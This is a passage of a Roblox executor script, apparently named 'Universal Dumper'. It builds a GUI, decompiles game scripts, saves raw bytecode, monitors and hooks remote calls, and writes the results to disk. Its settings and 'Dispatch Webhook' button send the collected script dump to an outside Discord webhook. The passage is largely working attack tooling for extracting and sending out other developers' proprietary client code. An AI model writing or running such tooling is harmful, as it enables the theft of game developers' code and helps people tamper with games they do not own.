	ScriptSearch.TextXAlignment = Enum.TextXAlignment.Left
	ScriptSearch.Parent = ScriptHeader
	corner(ScriptSearch, 4)
	stroke(ScriptSearch, THEME.Border, 1)

	local ScriptCountBadge = Instance.new("TextLabel")
	ScriptCountBadge.Text = "0 scripts collected"
	ScriptCountBadge.Font = FONT_BOLD
	ScriptCountBadge.TextSize = 10
	ScriptCountBadge.TextColor3 = THEME.AccentCyan
	ScriptCountBadge.TextXAlignment = Enum.TextXAlignment.Right
	ScriptCountBadge.BackgroundTransparency = 1
	ScriptCountBadge.Size = UDim2.new(0.5, 0, 1, 0)
	ScriptCountBadge.Position = UDim2.new(0.5, 0, 0, 0)
	ScriptCountBadge.Parent = ScriptHeader

	local ScriptListFrame = Instance.new("Frame")
	ScriptListFrame.Size = UDim2.new(1, -28, 1, -44)
	ScriptListFrame.Position = UDim2.new(0, 14, 0, 38)
	ScriptListFrame.BackgroundColor3 = THEME.CardBg
	ScriptListFrame.BorderSizePixel = 0
	ScriptListFrame.ClipsDescendants = true
	ScriptListFrame.Parent = PageScripts
	corner(ScriptListFrame, 6)
	stroke(ScriptListFrame, THEME.Border, 1)

	local ScriptScroll = Instance.new("ScrollingFrame")
	ScriptScroll.Size = UDim2.new(1, -8, 1, -8)
	ScriptScroll.Position = UDim2.new(0, 4, 0, 4)
	ScriptScroll.BackgroundTransparency = 1
	ScriptScroll.BorderSizePixel = 0
	ScriptScroll.ScrollBarThickness = 5
	ScriptScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
	ScriptScroll.Parent = ScriptListFrame

	local ScriptLayout = Instance.new("UIListLayout")
	ScriptLayout.SortOrder = Enum.SortOrder.LayoutOrder
	ScriptLayout.Padding = UDim.new(0, 4)
	ScriptLayout.Parent = ScriptScroll

	trackUIConn(ScriptLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
		ScriptScroll.CanvasSize = UDim2.new(0, 0, 0, ScriptLayout.AbsoluteContentSize.Y + 6)
	end))

	-- Script search filter
	trackUIConn(ScriptSearch:GetPropertyChangedSignal("Text"):Connect(function()
		local query = string.lower(ScriptSearch.Text)
		for _, row in ipairs(ScriptRows) do
			if query == "" or string.find(string.lower(row.path), query, 1, true) then
				row.frame.Visible = true
			else
				row.frame.Visible = false
			end
		end
	end))

	--==================================================
	-- 4. TAB: REMOTE MONITOR
	--==================================================
	local PageRemotes = Instance.new("Frame")
	PageRemotes.Name = "Page_Remotes"
	PageRemotes.Size = UDim2.new(1, 0, 1, 0)
	PageRemotes.BackgroundTransparency = 1
	PageRemotes.Visible = false
	PageRemotes.Parent = BodyContainer
	tabs["Remotes"] = PageRemotes

	local RemoteHeader = Instance.new("Frame")
	RemoteHeader.Size = UDim2.new(1, -28, 0, 28)
	RemoteHeader.Position = UDim2.new(0, 14, 0, 8)
	RemoteHeader.BackgroundTransparency = 1
	RemoteHeader.Parent = PageRemotes

	local RemoteSearch = Instance.new("TextBox")
	RemoteSearch.Size = UDim2.new(0, 240, 0, 24)
	RemoteSearch.Position = UDim2.new(0, 0, 0, 2)
	RemoteSearch.BackgroundColor3 = THEME.CardBg
	RemoteSearch.Text = ""
	RemoteSearch.PlaceholderText = "Filter remotes & bindables..."
	RemoteSearch.PlaceholderColor3 = THEME.TextMuted
	RemoteSearch.Font = FONT_REG
	RemoteSearch.TextSize = 10
	RemoteSearch.TextColor3 = THEME.TextPrimary
	RemoteSearch.TextXAlignment = Enum.TextXAlignment.Left
	RemoteSearch.Parent = RemoteHeader
	corner(RemoteSearch, 4)
	stroke(RemoteSearch, THEME.Border, 1)

	local RemoteCountBadge = Instance.new("TextLabel")
	RemoteCountBadge.Text = "0 remotes tracked"
	RemoteCountBadge.Font = FONT_BOLD
	RemoteCountBadge.TextSize = 10
	RemoteCountBadge.TextColor3 = THEME.AccentCyan
	RemoteCountBadge.TextXAlignment = Enum.TextXAlignment.Right
	RemoteCountBadge.BackgroundTransparency = 1
	RemoteCountBadge.Size = UDim2.new(0.5, 0, 1, 0)
	RemoteCountBadge.Position = UDim2.new(0.5, 0, 0, 0)
	RemoteCountBadge.Parent = RemoteHeader

	local RemoteListFrame = Instance.new("Frame")
	RemoteListFrame.Size = UDim2.new(1, -28, 1, -44)
	RemoteListFrame.Position = UDim2.new(0, 14, 0, 38)
	RemoteListFrame.BackgroundColor3 = THEME.CardBg
	RemoteListFrame.BorderSizePixel = 0
	RemoteListFrame.ClipsDescendants = true
	RemoteListFrame.Parent = PageRemotes
	corner(RemoteListFrame, 6)
	stroke(RemoteListFrame, THEME.Border, 1)

	local RemoteScroll = Instance.new("ScrollingFrame")
	RemoteScroll.Size = UDim2.new(1, -8, 1, -8)
	RemoteScroll.Position = UDim2.new(0, 4, 0, 4)
	RemoteScroll.BackgroundTransparency = 1
	RemoteScroll.BorderSizePixel = 0
	RemoteScroll.ScrollBarThickness = 5
	RemoteScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
	RemoteScroll.Parent = RemoteListFrame

	local RemoteLayout = Instance.new("UIListLayout")
	RemoteLayout.SortOrder = Enum.SortOrder.LayoutOrder
	RemoteLayout.Padding = UDim.new(0, 4)
	RemoteLayout.Parent = RemoteScroll

	trackUIConn(RemoteLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
		RemoteScroll.CanvasSize = UDim2.new(0, 0, 0, RemoteLayout.AbsoluteContentSize.Y + 6)
	end))

	trackUIConn(RemoteSearch:GetPropertyChangedSignal("Text"):Connect(function()
		local query = string.lower(RemoteSearch.Text)
		for _, row in pairs(RemoteRows) do
			if query == "" or string.find(string.lower(row.path), query, 1, true) then
				row.frame.Visible = true
			else
				row.frame.Visible = false
			end
		end
	end))

	--==================================================
	-- 5. TAB: SETTINGS & TOOLS
	--==================================================
	local PageSettings = Instance.new("Frame")
	PageSettings.Name = "Page_Settings"
	PageSettings.Size = UDim2.new(1, 0, 1, 0)
	PageSettings.BackgroundTransparency = 1
	PageSettings.Visible = false
	PageSettings.Parent = BodyContainer
	tabs["Settings"] = PageSettings

	local SettingsScroll = Instance.new("ScrollingFrame")
	SettingsScroll.Size = UDim2.new(1, -28, 1, -16)
	SettingsScroll.Position = UDim2.new(0, 14, 0, 8)
	SettingsScroll.BackgroundTransparency = 1
	SettingsScroll.BorderSizePixel = 0
	SettingsScroll.ScrollBarThickness = 5
	SettingsScroll.Parent = PageSettings

	local SettingsLayout = Instance.new("UIListLayout")
	SettingsLayout.SortOrder = Enum.SortOrder.LayoutOrder
	SettingsLayout.Padding = UDim.new(0, 8)
	SettingsLayout.Parent = SettingsScroll

	trackUIConn(SettingsLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
		SettingsScroll.CanvasSize = UDim2.new(0, 0, 0, SettingsLayout.AbsoluteContentSize.Y + 10)
	end))

	local function createSectionTitle(text)
		local lbl = Instance.new("TextLabel")
		lbl.Text = string.upper(text)
		lbl.Font = FONT_BOLD
		lbl.TextSize = 10
		lbl.TextColor3 = THEME.AccentCyan
		lbl.TextXAlignment = Enum.TextXAlignment.Left
		lbl.BackgroundTransparency = 1
		lbl.Size = UDim2.new(1, 0, 0, 16)
		lbl.Parent = SettingsScroll
		return lbl
	end

	local function createToggle(title, desc, initialVal, onToggle)
		local frame = Instance.new("Frame")
		frame.Size = UDim2.new(1, 0, 0, 42)
		frame.BackgroundColor3 = THEME.CardBg
		frame.BorderSizePixel = 0
		frame.Parent = SettingsScroll
		corner(frame, 6)
		stroke(frame, THEME.Border, 1)

		local tLbl = Instance.new("TextLabel")
		tLbl.Text = title
		tLbl.Font = FONT_BOLD
		tLbl.TextSize = 11
		tLbl.TextColor3 = THEME.TextPrimary
		tLbl.TextXAlignment = Enum.TextXAlignment.Left
		tLbl.BackgroundTransparency = 1
		tLbl.Position = UDim2.new(0, 12, 0, 6)
		tLbl.Size = UDim2.new(0.7, 0, 0, 14)
		tLbl.Parent = frame

		local dLbl = Instance.new("TextLabel")
		dLbl.Text = desc
		dLbl.Font = FONT_REG
		dLbl.TextSize = 9
		dLbl.TextColor3 = THEME.TextMuted
		dLbl.TextXAlignment = Enum.TextXAlignment.Left
		dLbl.BackgroundTransparency = 1
		dLbl.Position = UDim2.new(0, 12, 0, 22)
		dLbl.Size = UDim2.new(0.7, 0, 0, 14)
		dLbl.Parent = frame

		local tBtn = Instance.new("TextButton")
		tBtn.Size = UDim2.fromOffset(48, 22)
		tBtn.Position = UDim2.new(1, -60, 0.5, -11)
		tBtn.BackgroundColor3 = initialVal and THEME.AccentGreen or THEME.ConsoleBg
		tBtn.Text = initialVal and "ON" or "OFF"
		tBtn.Font = FONT_BOLD
		tBtn.TextSize = 10
		tBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
		tBtn.Parent = frame
		corner(tBtn, 4)

		local state = initialVal
		trackUIConn(tBtn.MouseButton1Click:Connect(function()
			state = not state
			tBtn.BackgroundColor3 = state and THEME.AccentGreen or THEME.ConsoleBg
			tBtn.Text = state and "ON" or "OFF"
			pcall(onToggle, state)
		end))
		return frame
	end

	createSectionTitle("Dumper Features")
	createToggle("Decompile Scripts", "Decompile bytecode using executor decompiler", Config.decompile, function(v) Config.decompile = v end)
	createToggle("Include Bytecode", "Save raw luau bytecode alongside sources", Config.includeBytecode, function(v) Config.includeBytecode = v end)
	createToggle("Anonymize Player Name", "Replace username with generic placeholder", Config.replaceUsername, function(v) Config.replaceUsername = v end)
	createToggle("Disable 3D Rendering", "Speed up dump on low-end devices", Config.disableRender, function(v)
		Config.disableRender = v
		pcall(function() RunService:Set3dRenderingEnabled(not v) end)
	end)

	createSectionTitle("Webhook Integration")
	local WebhookCard = Instance.new("Frame")
	WebhookCard.Size = UDim2.new(1, 0, 0, 74)
	WebhookCard.BackgroundColor3 = THEME.CardBg
	WebhookCard.BorderSizePixel = 0
	WebhookCard.Parent = SettingsScroll
	corner(WebhookCard, 6)
	stroke(WebhookCard, THEME.Border, 1)

	local wLbl = Instance.new("TextLabel")
	wLbl.Text = "Discord Webhook URL"
	wLbl.Font = FONT_BOLD
	wLbl.TextSize = 11
	wLbl.TextColor3 = THEME.TextPrimary
	wLbl.TextXAlignment = Enum.TextXAlignment.Left
	wLbl.BackgroundTransparency = 1
	wLbl.Position = UDim2.new(0, 12, 0, 8)
	wLbl.Size = UDim2.new(1, -24, 0, 14)
	wLbl.Parent = WebhookCard

	local WebhookInput = Instance.new("TextBox")
	WebhookInput.Size = UDim2.new(1, -130, 0, 26)
	WebhookInput.Position = UDim2.new(0, 12, 0, 32)
	WebhookInput.BackgroundColor3 = THEME.ConsoleBg
	WebhookInput.Text = Config.webhookUrl or ""
	WebhookInput.Font = FONT_MONO
	WebhookInput.TextSize = 9
	WebhookInput.TextColor3 = THEME.TextSecondary
	WebhookInput.TextXAlignment = Enum.TextXAlignment.Left
	WebhookInput.ClearTextOnFocus = false
	WebhookInput.Parent = WebhookCard
	corner(WebhookInput, 4)
	stroke(WebhookInput, THEME.Border, 1)

	trackUIConn(WebhookInput:GetPropertyChangedSignal("Text"):Connect(function()
		Config.webhookUrl = WebhookInput.Text
		Config.httpSink = WebhookInput.Text
	end))

	local TestPingBtn = Instance.new("TextButton")
	TestPingBtn.Size = UDim2.fromOffset(96, 26)
	TestPingBtn.Position = UDim2.new(1, -108, 0, 32)
	TestPingBtn.BackgroundColor3 = THEME.AccentBlue
	TestPingBtn.Text = "Ping Webhook"
	TestPingBtn.Font = FONT_BOLD
	TestPingBtn.TextSize = 10
	TestPingBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	TestPingBtn.Parent = WebhookCard
	corner(TestPingBtn, 4)

	trackUIConn(TestPingBtn.MouseButton1Click:Connect(function()
		TestPingBtn.Text = "Pinging..."
		task.spawn(function()
			if not httpRequest then
				TestPingBtn.Text = "No HTTP API"
				task.wait(1.5)
				TestPingBtn.Text = "Ping Webhook"
				return
			end
			local payload = HttpService:JSONEncode({
				content = "🔔 **Universal Dumper** — Test Ping received successfully!",
				embeds = {
					{
						title = "Webhook Verification",
						description = "The executor successfully verified HTTP connectivity.",
						color = 65280,
						fields = {
							{ name = "Place ID", value = tostring(game.PlaceId), inline = true },
							{ name = "Executor", value = identifyexecutor and identifyexecutor() or "Unknown", inline = true }
						}
					}
				}
			})
			local ok, resp = pcall(function()
				return httpRequest({
					Url = Config.webhookUrl,
					Method = "POST",
					Headers = { ["Content-Type"] = "application/json" },
					Body = payload
				})
			end)
			if ok and type(resp) == "table" and (resp.StatusCode == 200 or resp.StatusCode == 204) then
				TestPingBtn.Text = "Success (200)"
			else
				TestPingBtn.Text = "Failed"
			end
			task.wait(2)
			TestPingBtn.Text = "Ping Webhook"
		end)
	end))

	-- Wire Copy Path Button in Dashboard
	trackUIConn(CopyPathBtn.MouseButton1Click:Connect(function()
		local p = DISK_ROOT .. (OUT ~= "" and OUT:gsub("/", "\\") or "UniversalDumper")
		local setclip = (typeof(setclipboard) == "function" and setclipboard) or (typeof(toclipboard) == "function" and toclipboard)
		if typeof(setclip) == "function" then
			pcall(setclip, p)
			CopyPathBtn.Text = "Copied!"
			task.delay(1.5, function()
				if CopyPathBtn and CopyPathBtn.Parent then CopyPathBtn.Text = "📋 Copy Path" end
			end)
		end
	end))

	-- Wire Dispatch Now Button
	trackUIConn(DispatchNowBtn.MouseButton1Click:Connect(function()
		DispatchNowBtn.Text = "Dispatching..."
		task.spawn(function()
			local list = collectAllScripts and collectAllScripts() or {}
			dispatchDumpToWebhook(list)
			DispatchNowBtn.Text = "Dispatched!"
			task.wait(2)
			DispatchNowBtn.Text = "🚀 Dispatch Webhook"
		end)
	end))

	-- Wire Unload Button
	trackUIConn(UnloadBtn.MouseButton1Click:Connect(function()
		StatusText.Text = "UNLOADING"
		StatusText.TextColor3 = THEME.AccentRed
		StatusDot.BackgroundColor3 = THEME.AccentRed
		task.wait(0.1)
		if type(env.UNIVERSAL_DUMP_UNLOAD) == "function" then
			pcall(env.UNIVERSAL_DUMP_UNLOAD)
		else
			ScreenGui:Destroy()
		end
	end))

	-- Live Timer Loop
	local startTime = os.time()
	local timerRunning = true
	task.spawn(function()
		while timerRunning and ScreenGui.Parent do
			local elapsed = os.time() - startTime
			local m = math.floor(elapsed / 60)
			local s = elapsed % 60
			dashTimeVal.Text = string.format("%02d:%02d", m, s)
			task.wait(1)
		end
	end)

	-- Log Insertion
	local logCounter = 0
	local function addConsoleLog(kind, phase, text)
		logCounter = logCounter + 1
		local formatted = string.format("[%s] [%s] %s", os.date("%H:%M:%S"), string.upper(kind), text)
		table.insert(RawLogRows, formatted)

		local prefixColor = THEME.TextPrimary
		if kind == "boot" or kind == "info" then
			prefixColor = THEME.AccentCyan
		elseif kind == "prog" then
			prefixColor = THEME.TextMuted
		elseif kind == "done" then
			prefixColor = THEME.AccentGreen
		elseif kind == "warn" then
			prefixColor = THEME.AccentOrange
		elseif kind == "err" then
			prefixColor = THEME.AccentRed
		end

		-- Add to Full Terminal
		local tLbl = Instance.new("TextLabel")
		tLbl.Name = "Log_" .. tostring(logCounter)
		tLbl.Size = UDim2.new(1, -4, 0, 16)
		tLbl.BackgroundTransparency = 1
		tLbl.Font = FONT_MONO
		tLbl.TextSize = 10
		tLbl.TextColor3 = prefixColor
		tLbl.TextXAlignment = Enum.TextXAlignment.Left
		tLbl.Text = formatted
		tLbl.LayoutOrder = logCounter
		tLbl.Parent = TermScroll

		-- Add to Mini Console (keep max 100 for speed)
		local mLbl = Instance.new("TextLabel")
		mLbl.Name = "Mini_" .. tostring(logCounter)
		mLbl.Size = UDim2.new(1, -4, 0, 14)
		mLbl.BackgroundTransparency = 1
		mLbl.Font = FONT_MONO
		mLbl.TextSize = 9
		mLbl.TextColor3 = prefixColor
		mLbl.TextXAlignment = Enum.TextXAlignment.Left
		mLbl.Text = formatted
		mLbl.LayoutOrder = logCounter
		mLbl.Parent = MiniScroll

		if logCounter > 300 then
			local oldT = TermScroll:FindFirstChild("Log_" .. tostring(logCounter - 300))
			if oldT then oldT:Destroy() end
		end
		if logCounter > 100 then
			local oldM = MiniScroll:FindFirstChild("Mini_" .. tostring(logCounter - 100))
			if oldM then oldM:Destroy() end
		end
	end

	-- Script Tracker
	local scriptCount = 0
	local function recordScript(item)
		if not item or not item.path then return end
		scriptCount = scriptCount + 1
		ScriptCountBadge.Text = string.format("%d scripts collected", scriptCount)

		local card = Instance.new("Frame")
		card.Size = UDim2.new(1, -6, 0, 36)
		card.BackgroundColor3 = THEME.Bg
		card.BorderSizePixel = 0
		card.LayoutOrder = scriptCount
		card.Parent = ScriptScroll
		corner(card, 5)
		stroke(card, THEME.Border, 1)

		local nameLbl = Instance.new("TextLabel")
		nameLbl.Text = item.path
		nameLbl.Font = FONT_BOLD
		nameLbl.TextSize = 10
		nameLbl.TextColor3 = THEME.TextPrimary
		nameLbl.TextXAlignment = Enum.TextXAlignment.Left
		nameLbl.BackgroundTransparency = 1
		nameLbl.Position = UDim2.new(0, 10, 0, 4)
		nameLbl.Size = UDim2.new(1, -110, 0, 14)
		nameLbl.Parent = card

		local metaLbl = Instance.new("TextLabel")
		metaLbl.Text = string.format("%s | %d bytes | syntax: %s", tostring(item.class or "Script"), item.bytecodeSize or 0, tostring(item.syntax or "valid"))
		metaLbl.Font = FONT_REG
		metaLbl.TextSize = 9
		metaLbl.TextColor3 = THEME.TextMuted
		metaLbl.TextXAlignment = Enum.TextXAlignment.Left
		metaLbl.BackgroundTransparency = 1
		metaLbl.Position = UDim2.new(0, 10, 0, 18)
		metaLbl.Size = UDim2.new(1, -110, 0, 14)
		metaLbl.Parent = card

		local statusPill = Instance.new("TextLabel")
		local sCol = THEME.AccentGreen
		local st = string.lower(item.status or "dumped")
		if st == "bytecode" then
			sCol = THEME.AccentCyan
		elseif st == "timeout" then
			sCol = THEME.AccentOrange
		elseif st == "failed" then
			sCol = THEME.AccentRed
		end

		statusPill.Text = string.upper(item.status or "OK")
		statusPill.Font = FONT_BOLD
		statusPill.TextSize = 9
		statusPill.TextColor3 = sCol
		statusPill.BackgroundColor3 = THEME.ConsoleBg
		statusPill.Size = UDim2.fromOffset(70, 20)
		statusPill.Position = UDim2.new(1, -80, 0.5, -10)
		statusPill.Parent = card
		corner(statusPill, 4)
		stroke(statusPill, sCol, 1)

		table.insert(ScriptRows, { path = item.path, frame = card })
	end

	-- Remote Tracker
	local remoteCount = 0
	local function recordRemote(path, className, dir, argTypes)
		local existing = RemoteRows[path]
		if existing then
			existing.calls = (existing.calls or 0) + 1
			existing.callLbl.Text = string.format("Calls: %d", existing.calls)
			return
		end

		remoteCount = remoteCount + 1
		RemoteCountBadge.Text = string.format("%d remotes tracked", remoteCount)

		local card = Instance.new("Frame")
		card.Size = UDim2.new(1, -6, 0, 36)
		card.BackgroundColor3 = THEME.Bg
		card.BorderSizePixel = 0
		card.LayoutOrder = remoteCount
		card.Parent = RemoteScroll
		corner(card, 5)
		stroke(card, THEME.Border, 1)

		local nameLbl = Instance.new("TextLabel")
		nameLbl.Text = tostring(path)
		nameLbl.Font = FONT_BOLD
		nameLbl.TextSize = 10
		nameLbl.TextColor3 = THEME.TextPrimary
		nameLbl.TextXAlignment = Enum.TextXAlignment.Left
		nameLbl.BackgroundTransparency = 1
		nameLbl.Position = UDim2.new(0, 10, 0, 4)
		nameLbl.Size = UDim2.new(1, -120, 0, 14)
		nameLbl.Parent = card

		local channel = (className and string.find(className, "Bindable")) and "BINDABLE" or "NETWORK"
		local chCol = (channel == "BINDABLE") and THEME.AccentPurple or THEME.AccentBlue
		local metaLbl = Instance.new("TextLabel")
		metaLbl.Text = string.format("[%s] %s | dir: %s", channel, tostring(className or "Remote"), tostring(dir or "ANY"))
		metaLbl.Font = FONT_REG
		metaLbl.TextSize = 9
		metaLbl.TextColor3 = chCol
		metaLbl.TextXAlignment = Enum.TextXAlignment.Left
		metaLbl.BackgroundTransparency = 1
		metaLbl.Position = UDim2.new(0, 10, 0, 18)
		metaLbl.Size = UDim2.new(1, -120, 0, 14)
		metaLbl.Parent = card

		local callLbl = Instance.new("TextLabel")
		callLbl.Text = "Calls: 1"
		callLbl.Font = FONT_BOLD
		callLbl.TextSize = 9
		callLbl.TextColor3 = THEME.TextSecondary
		callLbl.BackgroundColor3 = THEME.ConsoleBg
		callLbl.Size = UDim2.fromOffset(70, 20)
		callLbl.Position = UDim2.new(1, -80, 0.5, -10)
		callLbl.Parent = card
		corner(callLbl, 4)
		stroke(callLbl, THEME.Border, 1)

		RemoteRows[path] = { path = path, frame = card, calls = 1, callLbl = callLbl }
	end

	-- Progress calculation
	local phaseWeights = {
		boot = 5,
		remotes = 15,
		values = 25,
		gui = 35,
		trees = 45,
		assets = 52,
		hooks = 58,
		scripts = 90,
		catalog = 93,
		manifest = 96,
		webhook = 98,
		complete = 100
	}

	local function updateProgress(phase, text, scriptCur, scriptTotal)
		local base = phaseWeights[string.lower(phase or "")] or 10
		local pct = base
		if string.lower(phase) == "scripts" and scriptCur and scriptTotal and scriptTotal > 0 then
			local scriptPct = math.clamp(scriptCur / scriptTotal, 0, 1)
			pct = math.floor(58 + (scriptPct * 32))
		end
		pct = math.clamp(pct, 0, 100)
		ProgressPercent.Text = tostring(pct) .. "%"
		BarFill.Size = UDim2.new(math.max(0.02, pct / 100), 0, 1, 0)
		PhasePill.Text = "PHASE: " .. string.upper(phase)
		StatusDetail.Text = text or ""

		if pct >= 100 then
			StatusDot.BackgroundColor3 = THEME.AccentGreen
			StatusText.Text = "COMPLETE"
			StatusText.TextColor3 = THEME.AccentGreen
			BarFill.BackgroundColor3 = THEME.AccentGreen
		end
	end

	local function updateStats(sFound, sDumped, sFail, rHooked, wOk, wFail, outPath)
		dashScriptsVal.Text = string.format("%d / %d", sDumped or 0, sFound or 0)
		dashScriptsSub.Text = string.format("%d failed", sFail or 0)
		dashRemotesVal.Text = tostring(rHooked or 0)
		dashWritesVal.Text = string.format("%d OK", wOk or 0)
		dashWritesSub.Text = string.format("%d errors", wFail or 0)
		if outPath and outPath ~= "" then
			infoOutLbl.Text = outPath:gsub("/", "\\")
		end
	end

	local function setWebhookStatus(status, color)
		WebhookStatusBadge.Text = status
		WebhookStatusBadge.TextColor3 = color or THEME.AccentGreen
		infoWebLbl.Text = status
	end

	DumperUI = {
		Gui = ScreenGui,
		AddLog = addConsoleLog,
		RecordScript = recordScript,
		RecordRemote = recordRemote,
		UpdateProgress = updateProgress,
		UpdateStats = updateStats,
		SetWebhookStatus = setWebhookStatus,
		Destroy = function()
			timerRunning = false
			for _, c in ipairs(UIConnections) do
				pcall(function() c:Disconnect() end)
			end
			UIConnections = {}
			if ScreenGui then
				pcall(function() ScreenGui:Destroy() end)
			end
		end
	}

	_G.UniversalDumperUI = DumperUI
	return DumperUI
end

task.spawn(function()
	pcall(createDumperUI)
end)

local appendFile = pickFn(typeof(appendfile) == "function" and appendfile, env and env.appendfile)
local identifyExecutor = pickFn(typeof(identifyexecutor) == "function" and identifyexecutor, env and env.identifyexecutor)

local Core = { running = true, connections = {}, namecallHook = nil, hookedMethods = {} }
local DecompileCache = {}
local ScriptsDumped = 0
local TimedOut = {}
local StaticRemoteRefs = {}
local RemoteIndex = {}
local ScriptSeen = {}
local ScriptHashByPath = {}
local ScriptMeta = {}
local HashUsed = {}
local BytecodeWritten = {}
local ScriptIndex = { totalFound = 0, dumped = 0, failed = 0, timedOut = 0, items = {} }
local Snap = { n = 0, last = nil, lastAt = 0, busy = false }
local Coverage = {
	instances = { discovered = 0, serialized = 0, failed = 0, unschematized = 0, truncated = false },
	scripts = { discovered = 0, decompiled = 0, bytecode_only = 0, failed = 0, syntaxValid = 0, deobfuscated = 0 },
	remotes = { discovered = 0, observed = 0 },
	gui = { discovered = 0, serialized = 0, truncated = false },
	assets = { discovered = 0 },
}
local Assets = {}
local StableIds = {}
local SessionSeq = 0
local ScriptHashById = {}
local OUT = ""
local WriteStats = { ok = 0, fail = 0, lastError = "" }
local Log = { lines = {}, phase = "boot" }
local DISK_ROOT = ""
local Live = {
	n = 0,
	pending = {},
	pendingNet = "",
	recent = {},
	fallbackBuf = {},
	appendReady = {},
	remotesHooked = {},
	invokePrev = {},
	invokeWrap = {},
	lastFlush = os.clock(),
	lastRewrap = os.clock(),
	lastCatalogWrite = 0,
	c2sGuard = 0,
}

local writeText
local writeJson
local log
local toJsonSafe
local serializeValue
local serializeArg
local serializeArgList
local extractRemoteStrings
local writePhase
local flushLiveLogs
local livePush
local writeRemoteCatalog
local dumpOneScript
local observeRemoteCall
local wrapOnClientInvoke
local hookRemoteIncoming
local ensureRemoteRecord
local takeSnapshot
local writeManifest
local writeAnalysisReport

local function trackConn(conn)
	if conn then
		table.insert(Core.connections, conn)
	end
	return conn
end

local function dbg(...)
	if not Config.debug then
		return
	end
	local parts = {}
	for i = 1, select("#", ...) do
		parts[i] = tostring(select(i, ...))
	end
	print("[Dump]", table.concat(parts, " "))
end
local function dbgWarn(...)
	if Config.debug then
		warn("[Dump]", ...)
	end
end

local function ensureDir(path)
	if not makeFolder then
		dbgWarn("makefolder API missing — writes may fail")
		return false
	end
	local built = ""
	for part in string.gmatch(path, "[^/]+") do
		built = built == "" and part or (built .. "/" .. part)
		if isFolder and isFolder(built) then
			continue
		end
		local ok, err = pcall(makeFolder, built)
		if not ok then
			dbgWarn("makefolder failed:", built, err)
			return false
		end
		dbg("mkdir", built)
	end
	return true
end

local function safePathSegment(text)
	text = tostring(text or "unknown")
	text = string.gsub(text, "[\\/:*?\"<>|\n\r]", " ")
	text = string.gsub(text, "%.%.", ". .")
	if #text > 180 then
		text = string.sub(text, -180)
	end
	return text
end

writeText = function(rel, text)
	if not writeFile then
		WriteStats.fail += 1
		WriteStats.lastError = "writefile API missing"
		dbgWarn("SKIP (no writefile):", rel)
		return false, "no writefile"
	end
	if OUT == "" then
		WriteStats.fail += 1
		WriteStats.lastError = "OUT not set"
		dbgWarn("SKIP (OUT empty):", rel)
		return false, "OUT empty"
	end
	ensureDir(OUT)
	local relPath = rel
	local dir = string.match(relPath, "^(.*)/[^/]+$")
	if dir then
		ensureDir(OUT .. "/" .. dir)
	end
	local full = OUT .. "/" .. relPath
	local ok, err = pcall(writeFile, full, text)
	if ok then
		WriteStats.ok += 1
		if Config.debug then
			dbg("WROTE", full, "(" .. #tostring(text) .. " bytes)")
		end
		return true
	end
	WriteStats.fail += 1
	WriteStats.lastError = tostring(err)
	dbgWarn("WRITE FAILED:", full, err)
	return false, err
end

local function jsonEncode(value)
	local ok, encoded = pcall(function()
		return HttpService:JSONEncode(value)
	end)
	if ok then
		return encoded, nil
	end
	return nil, encoded
end

writeJson = function(rel, payload)
	local encoded, err = jsonEncode(payload)
	if not encoded then
		encoded, err = jsonEncode(toJsonSafe(payload))
	end
	if not encoded then
		log("err", "json failed " .. rel .. ": " .. tostring(err))
		return false
	end
	local ok, werr = writeText(rel, encoded)
	if not ok then
		log("err", "write failed " .. rel .. ": " .. tostring(werr))
	end
	return ok
end

local function fileExists(full)
	if isFile then
		local ok, yes = pcall(isFile, full)
		if ok and yes then
			return true
		end
	end
	if readFile then
		local ok = pcall(readFile, full)
		if ok then
			return true
		end
	end
	return false
end

local function appendText(rel, text)
	if not text or text == "" then
		return true
	end
	if OUT == "" then
		return false, "OUT empty"
	end
	local dir = string.match(rel, "^(.*)/[^/]+$")
	if dir then
		ensureDir(OUT .. "/" .. dir)
	else
		ensureDir(OUT)
	end
	local full = OUT .. "/" .. rel
	if appendFile then
		if not Live.appendReady[rel] then
			if not fileExists(full) then
				pcall(writeFile, full, "")
			end
			Live.appendReady[rel] = true
		end
		local ok, err = pcall(appendFile, full, text)
		if ok then
			WriteStats.ok += 1
			return true
		end
		if not fileExists(full) then
			pcall(writeFile, full, "")
		end
		ok, err = pcall(appendFile, full, text)
		if ok then
			WriteStats.ok += 1
			return true
		end
		dbgWarn("appendfile failed:", rel, err)
	end
	local prev = ""
	if readFile then
		local rok, content = pcall(readFile, full)
		if rok and type(content) == "string" then
			prev = content
		end
	elseif Live.fallbackBuf[rel] then
		prev = Live.fallbackBuf[rel]
	end
	local combined = prev .. text
	Live.fallbackBuf[rel] = nil
	return writeText(rel, combined)
end

log = function(kind, text)
	local row = string.format("[%s] %s  %s", kind, Log.phase, text)
	table.insert(Log.lines, row)
	if Config.debug then
		print("[Dump] " .. text)
	end
	dbg(kind, text)
	if #Log.lines > 5000 then
		table.remove(Log.lines, 1)
	end
	if DumperUI and DumperUI.AddLog then
		pcall(function()
			DumperUI.AddLog(kind, Log.phase, text)
			DumperUI.UpdateProgress(Log.phase, text, ScriptsDumped, (ScriptIndex and ScriptIndex.totalFound) or 0)
			DumperUI.UpdateStats((ScriptIndex and ScriptIndex.totalFound) or 0, ScriptsDumped, (ScriptIndex and ScriptIndex.failed) or 0, (Coverage and Coverage.remotes and Coverage.remotes.discovered) or 0, WriteStats.ok, WriteStats.fail, OUT)
		end)
	end
	if writeFile and OUT ~= "" and (#Log.lines % 20 == 0) then
		pcall(function()
			writeText("log.txt", table.concat(Log.lines, "\n"))
			writeText("progress.txt", Log.phase .. "\n" .. text)
		end)
	end
end

local function probeFilesystem()
	dbg("=== FILESYSTEM PROBE ===")
	dbg("writefile:", writeFile ~= nil)
	dbg("makefolder:", makeFolder ~= nil)
	dbg("isfolder:", isFolder ~= nil)
	dbg("readfile:", readFile ~= nil)
	dbg("listfiles:", listFiles ~= nil)
	if not writeFile then
		dbgWarn("FATAL: writefile missing — dump cannot save")
		return false
	end
	ensureDir(Config.mainDir)
	local probeRel = Config.mainDir .. "/_write_probe.txt"
	local stamp = "probe ok " .. os.time() .. " place=" .. tostring(game.PlaceId)
	local ok, err = pcall(writeFile, probeRel, stamp)
	dbg("probe write", probeRel, "=>", ok, err)
	if not ok then
